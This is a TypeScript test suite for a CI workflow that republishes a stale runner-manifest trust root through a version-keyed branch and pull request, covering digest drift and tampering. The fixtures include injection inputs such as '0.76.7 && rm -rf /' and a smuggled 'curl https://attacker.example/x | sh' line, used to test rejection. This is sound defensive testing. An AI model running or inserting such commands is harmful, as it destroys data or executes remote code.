// The runner trust root (runner-manifest.json) rotted at v0.75.2 while releases
// shipped through v0.76.7: the publish job pushed a [skip ci] commit straight to
// a protected main (GH006, "Build & Test" is expected) and the detect gate keyed
// only on release-asset presence, so the never-landed manifest was never retried
// and every later run reported success. These tests pin both halves of the fix.
//
// The publication decision is tested through its exported functions; the delivery
// path is tested by EXECUTING the workflow's steps the way the runner does (its
// own default shell, one process per step, abort on failure) against a real local
// git remote and a recording `gh` double, then asserting the resulting refs,
// commits, release assets and CLI call sequence.

import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  copyFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  decideRunnerPublication,
  expectedRunnerAssets,
  manifestBranchName,
} from '../../../../scripts/runner-manifest-publication.mts';
import {
  ghCommands,
  installGhStub,
  loadWorkflow,
  runJobSteps,
  shellCommands,
  type GhPullRequest,
  type GhStub,
  type WorkflowStep,
} from '../helpers/workflow-job-runner.ts';

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..', '..');
const workflowPath = join(repoRoot, '.github', 'workflows', 'runner-artifacts.yml');
const workflow = loadWorkflow(workflowPath);

const VERSION = '0.76.7';
const TAG = `v${VERSION}`;
const BRANCH = `chore/runner-manifest-v${VERSION}`;
const IOS_ZIP = `rn-fast-runner-${VERSION}-sim.zip`;
const ANDROID_ZIP = `rn-android-runner-${VERSION}.zip`;
const IOS_BYTES = 'ios-runner-zip-bytes';
const ANDROID_BYTES = 'android-runner-zip-bytes';

function steps(jobId: string): WorkflowStep[] {
  return workflow.jobs[jobId].steps ?? [];
}

function everyStep(): Array<{ jobId: string; step: WorkflowStep }> {
  return Object.entries(workflow.jobs).flatMap(([jobId, job]) =>
    (job.steps ?? []).map((step) => ({ jobId, step })),
  );
}

const COMPLETE_RELEASE = [IOS_ZIP, ANDROID_ZIP, 'runner-manifest.json'];

function manifestFor(version: string, sha = 'a'.repeat(64)): string {
  return JSON.stringify({
    version,
    assets: {
      ios: [{ name: `rn-fast-runner-${version}-sim.zip`, sha256: sha, bytes: 1 }],
      android: [{ name: `rn-android-runner-${version}.zip`, sha256: sha, bytes: 2 }],
    },
  });
}

// --- stale-manifest detection ---

test('a complete release with a stale in-repo manifest still needs publication', () => {
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: COMPLETE_RELEASE,
    repoManifest: manifestFor('0.75.2'),
    publishedManifest: manifestFor(VERSION),
  });
  assert.equal(decision.publishManifest, true, 'the v0.75.2 trust root must be re-delivered');
  assert.equal(
    decision.buildRunners,
    false,
    'the release already carries both zips — do not rebuild',
  );
  assert.match(decision.reason, /stale/);
});

test('a manifest that matches the published one for this version is already current', () => {
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: COMPLETE_RELEASE,
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.publishManifest, false);
  assert.equal(decision.buildRunners, false);
});

test('property order never decides publication', () => {
  const ordered = JSON.stringify({
    version: VERSION,
    assets: { ios: [{ name: 'x', sha256: 'y', bytes: 1 }], android: [] },
  });
  const reordered = JSON.stringify({
    assets: { android: [], ios: [{ bytes: 1, sha256: 'y', name: 'x' }] },
    version: VERSION,
  });
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: COMPLETE_RELEASE,
    repoManifest: ordered,
    publishedManifest: reordered,
  });
  assert.equal(decision.publishManifest, false, 'reordered keys would re-open a PR every sweep');
});

test('same version but drifted digests counts as stale', () => {
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: COMPLETE_RELEASE,
    repoManifest: manifestFor(VERSION, 'b'.repeat(64)),
    publishedManifest: manifestFor(VERSION, 'c'.repeat(64)),
  });
  assert.equal(decision.publishManifest, true);
});

test('a missing or unparseable in-repo manifest is stale, never assumed current', () => {
  for (const repoManifest of [null, '', 'not json', '[]']) {
    const decision = decideRunnerPublication({
      pluginVersion: VERSION,
      releaseAssets: COMPLETE_RELEASE,
      repoManifest,
      publishedManifest: manifestFor(VERSION),
    });
    assert.equal(decision.publishManifest, true, `repoManifest=${JSON.stringify(repoManifest)}`);
  }
});

// The {name, digest, size} records `gh release view --json assets` returns for a
// release that still serves exactly what `manifest` describes.
function servedAssets(
  manifest: string,
  overrides: Record<string, { digest?: string | null; size?: number }> = {},
): Array<Record<string, unknown>> {
  const parsed = JSON.parse(manifest);
  const zips = [...parsed.assets.ios, ...parsed.assets.android].map((asset) => ({
    name: asset.name,
    digest: `sha256:${asset.sha256}`,
    size: asset.bytes,
    ...overrides[asset.name],
  }));
  return [...zips, { name: 'runner-manifest.json', digest: `sha256:${'f'.repeat(64)}`, size: 42 }];
}

test('a release still serving the zips the trust root describes is already published', () => {
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(current),
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.publishManifest, false);
});

test('a runner zip replaced without a manifest refresh is rebuilt, never re-hashed', () => {
  // Both manifests still agree — they are copies of each other — so only the
  // asset's own digest reveals that the release serves different bytes. Adopting
  // them would turn the client's rejection of a substituted archive into a
  // routine-looking trust-root PR that a maintainer approves as bot maintenance.
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(current, { [IOS_ZIP]: { digest: `sha256:${'b'.repeat(64)}` } }),
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.buildRunners, true, 'the trust root may only describe bytes we built');
  assert.equal(decision.publishManifest, true);
  assert.match(decision.reason, new RegExp(IOS_ZIP.replace(/\./g, '\\.')));
});

test('a substituted zip is caught while the trust root is still stale', () => {
  // The delivery window the workflow exists to close: the manifest PR for this
  // version has not landed, so the in-repo manifest still describes v0.75.2 and
  // names nothing on this release. Judged against it alone the guard is inert —
  // and this is the state the repository is actually in between a release and
  // its approved trust-root PR. The manifest ASSET on the release is the
  // workflow's own record of what it published, and it does name these zips.
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(manifestFor(VERSION), {
      [IOS_ZIP]: { digest: `sha256:${'b'.repeat(64)}` },
    }),
    repoManifest: manifestFor('0.75.2'),
    publishedManifest: manifestFor(VERSION),
  });
  assert.equal(
    decision.buildRunners,
    true,
    'a stale trust root must not make the substituted zip publishable',
  );
  assert.equal(decision.publishManifest, true);
  assert.match(decision.reason, new RegExp(IOS_ZIP.replace(/\./g, '\\.')));
});

test('the rebuild that repairs drift converges instead of re-firing every sweep', () => {
  // After the rebuild the release serves freshly built zips AND carries the
  // manifest asset regenerated from them. A guard that kept measuring against
  // the still-unlanded in-repo trust root would call that drift too, rebuild
  // again, and move the PR head every 6 hours — voiding the approval it needs.
  const rebuilt = manifestFor(VERSION, 'c'.repeat(64));
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(rebuilt),
    repoManifest: manifestFor('0.75.2'),
    publishedManifest: rebuilt,
  });
  assert.equal(decision.buildRunners, false, 'the rebuilt zips are what we just published');
  assert.equal(decision.publishManifest, true, 'the stale trust root still has to be delivered');
  assert.match(decision.reason, /stale/);
});

test('drift alongside a missing zip rebuilds too', () => {
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(current, {
      [IOS_ZIP]: { digest: `sha256:${'b'.repeat(64)}` },
    }).filter((asset) => asset.name !== ANDROID_ZIP),
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.buildRunners, true);
  assert.equal(decision.publishManifest, true);
});

test('a size change alone is drift, even when the release reports no digest', () => {
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(current, { [ANDROID_ZIP]: { digest: null, size: 999 } }),
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.buildRunners, true);
  assert.match(decision.reason, new RegExp(ANDROID_ZIP.replace(/\./g, '\\.')));
});

test('the in-repo manifest is the drift evidence when the release has no manifest asset', () => {
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(current, { [IOS_ZIP]: { digest: `sha256:${'b'.repeat(64)}` } }),
    repoManifest: current,
    publishedManifest: null,
  });
  assert.equal(decision.buildRunners, true);
  assert.match(decision.reason, new RegExp(IOS_ZIP.replace(/\./g, '\\.')));
});

test('force_version rebuilds regardless of what the release currently serves', () => {
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    forceVersion: VERSION,
    releaseAssets: servedAssets(current, { [IOS_ZIP]: { digest: `sha256:${'b'.repeat(64)}` } }),
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.buildRunners, true, 'both zips are rebuilt from source');
  assert.equal(decision.publishManifest, true);
});

test('assets reported without digest or size never fabricate drift', () => {
  // A release listing that carries no evidence about the bytes must fall through
  // to the manifest comparison, not re-open a PR on every sweep forever.
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: COMPLETE_RELEASE,
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.publishManifest, false);
});

test('a rebuilt release converges: the next sweep stands down', () => {
  // What the publish job does after a rebuild — hash the zips now on the release
  // and commit that manifest — must end the loop rather than restart it.
  const drifted = manifestFor(VERSION, 'b'.repeat(64));
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: servedAssets(drifted),
    repoManifest: drifted,
    publishedManifest: drifted,
  });
  assert.equal(decision.publishManifest, false);
});

test('a release missing a runner zip rebuilds and republishes', () => {
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: [IOS_ZIP],
    repoManifest: manifestFor(VERSION),
    publishedManifest: manifestFor(VERSION),
  });
  assert.equal(decision.buildRunners, true);
  assert.equal(decision.publishManifest, true);
});

test('a release with both zips but no published manifest asset republishes', () => {
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: [IOS_ZIP, ANDROID_ZIP],
    repoManifest: manifestFor(VERSION),
    publishedManifest: null,
  });
  assert.equal(decision.buildRunners, false);
  assert.equal(decision.publishManifest, true);
});

// --- the trust root may only ever track the installed plugin version ---

test('force_version re-publishes the current version, skipping the missing-assets check', () => {
  const current = manifestFor(VERSION);
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    forceVersion: VERSION,
    releaseAssets: COMPLETE_RELEASE,
    repoManifest: current,
    publishedManifest: current,
  });
  assert.equal(decision.version, VERSION);
  assert.equal(decision.buildRunners, true);
  assert.equal(decision.publishManifest, true);
});

test('a historical force_version is refused instead of downgrading the trust root', () => {
  const current = manifestFor(VERSION);
  assert.throws(
    () =>
      decideRunnerPublication({
        pluginVersion: VERSION,
        forceVersion: '0.76.5',
        releaseAssets: [],
        repoManifest: current,
        publishedManifest: current,
      }),
    /does not match the current plugin version/,
    'a v0.76.5 trust root would send every v0.76.7 client back to the local build',
  );
});

test('an operator-supplied force_version that is not a release version is rejected', () => {
  for (const bad of ['main', '0.76.7 && rm -rf /', '../../evil', 'v0.76.7', '01.2.3', '1.2.3-01']) {
    assert.throws(
      () =>
        decideRunnerPublication({
          pluginVersion: VERSION,
          forceVersion: bad,
          releaseAssets: COMPLETE_RELEASE,
          repoManifest: manifestFor(VERSION),
        }),
      /not a release version|does not match the current plugin version/,
      `accepted force_version ${JSON.stringify(bad)}`,
    );
  }
  assert.throws(() => manifestBranchName('main; echo'), /not a release version/);
  assert.throws(() => manifestBranchName('1.2.3-alpha..1'), /not a release version/);
});

test('the manifest branch is a pure function of the version, so reruns converge', () => {
  assert.equal(manifestBranchName(VERSION), BRANCH);
  assert.notEqual(manifestBranchName(VERSION), manifestBranchName('0.76.8'));
  const decision = decideRunnerPublication({
    pluginVersion: VERSION,
    releaseAssets: COMPLETE_RELEASE,
    repoManifest: manifestFor('0.75.2'),
    publishedManifest: manifestFor(VERSION),
  });
  assert.equal(decision.branch, BRANCH);
});

test('expected release asset names stay pinned to the client download contract', () => {
  assert.deepEqual(expectedRunnerAssets(VERSION), {
    ios: IOS_ZIP,
    android: ANDROID_ZIP,
    manifest: 'runner-manifest.json',
  });
});

// --- executable workflow simulation ---

type Fixture = {
  root: string;
  origin: string;
  gh: GhStub;
  cleanup: () => void;
};

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf8',
    env: {
      ...process.env,
      GIT_CONFIG_GLOBAL: '/dev/null',
      GIT_CONFIG_SYSTEM: '/dev/null',
      GIT_TERMINAL_PROMPT: '0',
      GIT_AUTHOR_NAME: 'fixture',
      GIT_AUTHOR_EMAIL: 'fixture@example.com',
      GIT_COMMITTER_NAME: 'fixture',
      GIT_COMMITTER_EMAIL: 'fixture@example.com',
    },
  }).toString();
}

function write(root: string, relative: string, content: string): void {
  const path = join(root, relative);
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, content);
}

type FixtureOptions = {
  pluginVersion?: string;
  repoManifest?: string;
  releaseAssets?: Record<string, string>;
  prs?: GhPullRequest[];
  supersededBranches?: string[];
  manifestBranchFiles?: Record<string, string>;
};

function createFixture(options: FixtureOptions = {}): Fixture {
  const root = mkdtempSync(join(tmpdir(), 'runner-manifest-workflow-'));
  const origin = join(root, 'origin.git');
  const seed = join(root, 'seed');
  git(root, 'init', '--quiet', '--bare', '--initial-branch=main', origin);

  mkdirSync(seed);
  git(seed, 'init', '--quiet', '--initial-branch=main');
  write(
    seed,
    'packages/claude-plugin/plugin.json',
    `{"version": "${options.pluginVersion ?? VERSION}"}\n`,
  );
  const stale = options.repoManifest ?? manifestFor('0.75.2') + '\n';
  for (const path of [
    'runner-manifest.json',
    'packages/codex-plugin/runner-manifest.json',
    'packages/claude-plugin/runner-manifest.json',
  ]) {
    write(seed, path, stale);
  }
  // Unrelated tracked file: a manifest commit must never carry anything else.
  write(seed, 'README.md', 'unrelated repository content\n');
  for (const script of ['build-runner-manifest.mts', 'runner-manifest-publication.mts']) {
    mkdirSync(join(seed, 'scripts'), { recursive: true });
    copyFileSync(join(repoRoot, 'scripts', script), join(seed, 'scripts', script));
  }
  git(seed, 'add', '-A');
  git(seed, 'commit', '--quiet', '-m', 'seed');
  git(seed, 'remote', 'add', 'origin', `file://${origin}`);
  git(seed, 'push', '--quiet', 'origin', 'main');
  for (const branch of options.supersededBranches ?? []) {
    git(seed, 'push', '--quiet', 'origin', `main:refs/heads/${branch}`);
  }
  if (options.manifestBranchFiles) {
    // Someone with write access pushes onto the workflow-owned manifest branch.
    git(seed, 'checkout', '--quiet', '-b', BRANCH);
    for (const [path, content] of Object.entries(options.manifestBranchFiles)) {
      write(seed, path, content);
    }
    git(seed, 'add', '-A');
    git(seed, 'commit', '--quiet', '-m', 'unrelated work pushed onto the manifest branch');
    git(seed, 'push', '--quiet', 'origin', BRANCH);
    git(seed, 'checkout', '--quiet', 'main');
  }

  const gh = installGhStub(root, {
    releases: options.releaseAssets && {
      [TAG]: options.releaseAssets,
    },
    prs: options.prs,
    nextPr: 11,
    gitDir: origin,
  });
  return { root, origin, gh, cleanup: () => rmSync(root, { force: true, recursive: true }) };
}

let advanceCounter = 0;

function advanceMain(fixture: Fixture, path: string, content: string): void {
  const dir = join(fixture.root, `advance-${advanceCounter++}`);
  git(fixture.root, 'clone', '--quiet', `file://${fixture.origin}`, dir);
  write(dir, path, content);
  git(dir, 'add', '-A');
  git(dir, 'commit', '--quiet', '-m', 'unrelated work on main');
  git(dir, 'push', '--quiet', 'origin', 'main');
}

function checkout(fixture: Fixture, name: string): string {
  const dir = join(fixture.root, name);
  // actions/checkout's default: a single-branch shallow clone of the target ref.
  git(
    fixture.root,
    'clone',
    '--quiet',
    '--depth',
    '1',
    '--single-branch',
    '--branch',
    'main',
    `file://${fixture.origin}`,
    dir,
  );
  return dir;
}

function publishContext(overrides: Record<string, string> = {}): Record<string, string> {
  return {
    'needs.detect.outputs.version': VERSION,
    'needs.detect.outputs.branch': BRANCH,
    'secrets.GITHUB_TOKEN': 'stub-token',
    'github.repository': 'Lykhoyda/rn-dev-agent',
    ...overrides,
  };
}

function runPublish(
  fixture: Fixture,
  {
    workdir,
    env = {},
    ctx = {},
  }: { workdir: string; env?: Record<string, string>; ctx?: Record<string, string> },
) {
  return runJobSteps({
    workflow,
    jobId: 'publish-manifest',
    cwd: workdir,
    ctx: publishContext(ctx),
    env: {
      ...fixture.gh.env,
      GIT_CONFIG_GLOBAL: '/dev/null',
      GIT_CONFIG_SYSTEM: '/dev/null',
      GIT_TERMINAL_PROMPT: '0',
      ...env,
    },
  });
}

const DETECT_CTX = {
  'secrets.GITHUB_TOKEN': 'stub-token',
  'github.repository': 'Lykhoyda/rn-dev-agent',
  'github.event.inputs.force_version': '',
};

function runDetect(fixture: Fixture) {
  return runJobSteps({
    workflow,
    jobId: 'detect',
    cwd: checkout(fixture, 'detect'),
    ctx: DETECT_CTX,
    env: fixture.gh.env,
    only: ['Decide what this run must build and publish'],
  });
}

function completeRelease(): Record<string, string> {
  return { [IOS_ZIP]: IOS_BYTES, [ANDROID_ZIP]: ANDROID_BYTES };
}

// The manifest scripts/build-runner-manifest.mts produces for the seeded zips,
// serialised the way it writes the file.
function currentManifest(): string {
  return (
    JSON.stringify(
      {
        version: VERSION,
        assets: {
          ios: [{ name: IOS_ZIP, sha256: sha256(IOS_BYTES), bytes: IOS_BYTES.length }],
          android: [
            { name: ANDROID_ZIP, sha256: sha256(ANDROID_BYTES), bytes: ANDROID_BYTES.length },
          ],
        },
      },
      null,
      2,
    ) + '\n'
  );
}

function sha256(content: string): string {
  return createHash('sha256').update(Buffer.from(content)).digest('hex');
}

function originRef(fixture: Fixture, ref: string): string | null {
  const out = git(
    fixture.root,
    '--git-dir',
    fixture.origin,
    'for-each-ref',
    '--format=%(objectname)',
    `refs/heads/${ref}`,
  ).trim();
  return out === '' ? null : out;
}

const BRANCH_STEP = 'Reuse or recreate the version-keyed manifest branch';

function stepStdout(run: { steps: Array<{ name: string; stdout: string }> }, name: string): string {
  const step = run.steps.find((s) => s.name === name);
  assert.ok(step, `the job never ran the step "${name}"`);
  return step.stdout;
}

function ghCalls(fixture: Fixture): string[] {
  return ghCommands(fixture.gh.calls());
}

test('a stale trust root is delivered by a manifest branch and PR, never by touching main', () => {
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const mainBefore = originRef(fixture, 'main');
    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);

    assert.equal(
      originRef(fixture, 'main'),
      mainBefore,
      'main must be reached only through the PR',
    );
    const head = originRef(fixture, BRANCH);
    assert.ok(head, 'the manifest branch must exist on the remote');

    const log = git(
      fixture.root,
      '--git-dir',
      fixture.origin,
      'log',
      '--format=%s',
      `${mainBefore}..${head}`,
    )
      .trim()
      .split('\n');
    assert.deepEqual(log, [`chore(release): runner-manifest for v${VERSION}`]);
    assert.doesNotMatch(
      log[0],
      /\[\s*skip[ -]ci\s*\]/i,
      'a CI-skipped commit can never produce "Build & Test"',
    );

    const touched = git(
      fixture.root,
      '--git-dir',
      fixture.origin,
      'show',
      '--name-only',
      '--format=',
      head,
    )
      .trim()
      .split('\n')
      .sort();
    assert.deepEqual(touched, [
      'packages/claude-plugin/runner-manifest.json',
      'packages/codex-plugin/runner-manifest.json',
      'runner-manifest.json',
    ]);

    const committed = git(
      fixture.root,
      '--git-dir',
      fixture.origin,
      'show',
      `${head}:runner-manifest.json`,
    );
    const manifest = JSON.parse(committed);
    assert.equal(manifest.version, VERSION);
    assert.deepEqual(manifest.assets.ios, [
      { name: IOS_ZIP, sha256: sha256(IOS_BYTES), bytes: IOS_BYTES.length },
    ]);
    assert.deepEqual(manifest.assets.android, [
      { name: ANDROID_ZIP, sha256: sha256(ANDROID_BYTES), bytes: ANDROID_BYTES.length },
    ]);
    for (const copy of [
      'packages/codex-plugin/runner-manifest.json',
      'packages/claude-plugin/runner-manifest.json',
    ]) {
      assert.equal(
        git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:${copy}`),
        committed,
        `${copy} must carry the same trust root as the root manifest`,
      );
    }

    // The release asset and the committed manifest are the same bytes, which is
    // what lets detect recognise the trust root as current on the next sweep.
    assert.equal(
      readFileSync(fixture.gh.assetPath(TAG, 'runner-manifest.json'), 'utf8'),
      committed,
    );

    const state = fixture.gh.state();
    assert.equal(state.prs.length, 1, 'exactly one manifest PR');
    assert.deepEqual(
      { head: state.prs[0].headRefName, base: state.prs[0].baseRefName, state: state.prs[0].state },
      { head: BRANCH, base: 'main', state: 'OPEN' },
    );
    assert.equal(
      state.prs[0].autoMerge,
      'squash',
      'the PR must be armed to merge once checks pass',
    );
  } finally {
    fixture.cleanup();
  }
});

test('a just-created PR the list API cannot see yet is still armed for auto-merge', () => {
  // The pre-fix job re-queried `gh pr list --head` after creating the PR and
  // aborted when the lookup came back empty, stranding an armed-less PR — and
  // the trust root — until the next sweep.
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const run = runPublish(fixture, {
      workdir: checkout(fixture, 'run1'),
      env: { GH_STUB_LIST_HEAD_BLIND: '1' },
    });
    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
    const state = fixture.gh.state();
    assert.equal(state.prs.length, 1);
    assert.equal(state.prs[0].autoMerge, 'squash');
    assert.equal(
      ghCalls(fixture).filter((c) => c.startsWith('pr list --head')).length,
      1,
      'the PR number must come from `gh pr create`, not a second lookup',
    );
  } finally {
    fixture.cleanup();
  }
});

test('rerunning the publish job converges: no second commit, no second PR', () => {
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
    const headAfterFirst = originRef(fixture, BRANCH);

    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);

    assert.equal(originRef(fixture, BRANCH), headAfterFirst, 'a rerun must not add a commit');
    const state = fixture.gh.state();
    assert.equal(state.prs.length, 1, 'a rerun must reuse the open PR, never stack a duplicate');
    assert.equal(state.prs[0].autoMerge, 'squash');
    assert.equal(
      ghCalls(fixture).filter((c) => c.startsWith('pr create')).length,
      1,
      'exactly one creation across both runs',
    );
    // Re-uploading the manifest asset must be tolerated, not a hard failure.
    assert.equal(state.releases[TAG].assets['runner-manifest.json'].uploads, 2);
  } finally {
    fixture.cleanup();
  }
});

test('main advancing while the manifest PR waits leaves its head untouched', () => {
  // A GITHUB_TOKEN PR's CI parks at action_required per head SHA, so re-pushing
  // the branch discards the maintainer's "Approve and run". An unrelated commit
  // on main must therefore not move the head at all.
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
    const head = originRef(fixture, BRANCH);
    const pr = fixture.gh.state().prs[0].number;

    advanceMain(fixture, 'docs/unrelated.md', 'work that has nothing to do with runners\n');
    advanceMain(fixture, 'README.md', 'main moved again\n');

    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
    assert.match(stepStdout(second, BRANCH_STEP), /reusing/, 'the head must be kept, not rebuilt');
    assert.equal(second.outputs.commit.pushed, 'false', 'nothing changed — nothing to push');
    assert.equal(originRef(fixture, BRANCH), head, 'the approved head SHA must survive');
    assert.deepEqual(
      fixture.gh.state().prs.map((p) => p.number),
      [pr],
      'the same PR must be reused',
    );
    assert.equal(fixture.gh.state().prs[0].autoMerge, 'squash');
  } finally {
    fixture.cleanup();
  }
});

test('a branch this workflow already extended keeps being reused, never churned', () => {
  // The workflow makes a second commit whenever the release digests drift. That
  // must not turn its own branch into a foreign one: the head would then be
  // rewritten on every advance of main, discarding the maintainer's approval
  // each time and never letting the required check accumulate.
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);

    writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'rebuilt-ios-runner-zip-bytes');
    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
    assert.equal(second.outputs.commit.pushed, 'true', 'drifted digests must be re-committed');
    const twoCommits = originRef(fixture, BRANCH);
    assert.equal(
      git(
        fixture.root,
        '--git-dir',
        fixture.origin,
        'rev-list',
        '--count',
        String(twoCommits),
      ).trim(),
      String(
        Number(
          git(
            fixture.root,
            '--git-dir',
            fixture.origin,
            'rev-list',
            '--count',
            String(originRef(fixture, 'main')),
          ).trim(),
        ) + 2,
      ),
      'the branch now carries two commits of this workflow',
    );

    advanceMain(fixture, 'docs/unrelated.md', 'more unrelated work\n');
    const third = runPublish(fixture, { workdir: checkout(fixture, 'run3') });
    assert.ok(third.ok, `third run failed at ${third.failed?.name}: ${third.failed?.stderr}`);
    assert.match(stepStdout(third, BRANCH_STEP), /reusing/, 'two commits is not foreign');
    assert.equal(third.outputs.commit.pushed, 'false');
    assert.equal(originRef(fixture, BRANCH), twoCommits, 'the approved head must survive');
  } finally {
    fixture.cleanup();
  }
});

test('a fork PR whose branch merely looks like a manifest branch is left alone', () => {
  // Head-ref names on fork PRs are chosen by the contributor and need no
  // repository permission, so a look-alike must not be closed — and because the
  // close is fatal, must not be able to block trust-root delivery either.
  const fixture = createFixture({
    releaseAssets: completeRelease(),
    prs: [
      {
        number: 7,
        headRefName: 'chore/runner-manifest-v0.76.6',
        headRepo: 'outsider/rn-dev-agent',
        baseRefName: 'main',
        state: 'OPEN',
        autoMerge: null,
        closeComment: null,
      },
      {
        number: 8,
        headRefName: 'chore/runner-manifest-vsomething',
        baseRefName: 'main',
        state: 'OPEN',
        autoMerge: null,
        closeComment: null,
      },
    ],
  });
  try {
    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
    const state = fixture.gh.state();
    assert.equal(state.prs.find((pr) => pr.number === 7)?.state, 'OPEN', 'fork PR must be spared');
    assert.equal(
      state.prs.find((pr) => pr.number === 8)?.state,
      'OPEN',
      'a non-version suffix is not a manifest branch',
    );
    assert.equal(
      ghCalls(fixture).some((c) => c.startsWith('pr close')),
      false,
    );
    assert.equal(state.prs.find((pr) => pr.headRefName === BRANCH)?.autoMerge, 'squash');
  } finally {
    fixture.cleanup();
  }
});

test('a branch replaced after tampering stops churning once main advances again', () => {
  // Correcting a tampered branch in place cannot move the merge base, so the
  // comparison would report main's own files as branch-side changes forever and
  // rewrite the PR head on every merge to main. Cutting the branch again from
  // current main resets that base.
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
    const firstPr = fixture.gh.state().prs[0].number;

    advanceMain(fixture, 'docs/a.md', 'unrelated work landed on main\n');
    const dir = join(fixture.root, 'tamper');
    git(fixture.root, 'clone', '--quiet', '--branch', BRANCH, `file://${fixture.origin}`, dir);
    write(dir, 'evil.sh', 'curl https://attacker.example/x | sh\n');
    git(dir, 'add', '-A');
    git(dir, 'commit', '--quiet', '-m', 'smuggled');
    git(dir, 'push', '--quiet', 'origin', BRANCH);

    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);
    assert.match(stepStdout(second, BRANCH_STEP), /discarding/);
    const replaced = originRef(fixture, BRANCH);
    // Deleting the head branch closes its PR, so the replacement gets a new one
    // rather than silently reusing the pull request opened over tampered content.
    const afterDiscard = fixture.gh.state().prs;
    assert.equal(
      afterDiscard.find((pr) => pr.number === firstPr)?.closedByBranchDelete,
      true,
      'the PR over the tampered branch must be closed by the deletion',
    );
    assert.equal(afterDiscard.filter((pr) => pr.state === 'OPEN').length, 1);
    assert.notEqual(
      afterDiscard.find((pr) => pr.state === 'OPEN')?.number,
      firstPr,
      'a discarded branch must not keep the old pull request',
    );

    advanceMain(fixture, 'docs/b.md', 'and more unrelated work\n');
    const third = runPublish(fixture, { workdir: checkout(fixture, 'run3') });
    assert.ok(third.ok, `third run failed at ${third.failed?.name}: ${third.failed?.stderr}`);
    assert.match(
      stepStdout(third, BRANCH_STEP),
      /reusing/,
      "the replacement must read as clean, not as carrying main's own files",
    );
    assert.equal(third.outputs.commit.pushed, 'false');
    assert.equal(originRef(fixture, BRANCH), replaced, 'the head must stop being rewritten');

    const fourth = runPublish(fixture, { workdir: checkout(fixture, 'run4') });
    assert.ok(fourth.ok, `fourth run failed at ${fourth.failed?.name}: ${fourth.failed?.stderr}`);
    assert.equal(originRef(fixture, BRANCH), replaced);
    assert.equal(
      fixture.gh.state().prs.filter((pr) => pr.state === 'OPEN').length,
      1,
      'exactly one manifest PR stays open through all of it',
    );
  } finally {
    fixture.cleanup();
  }
});

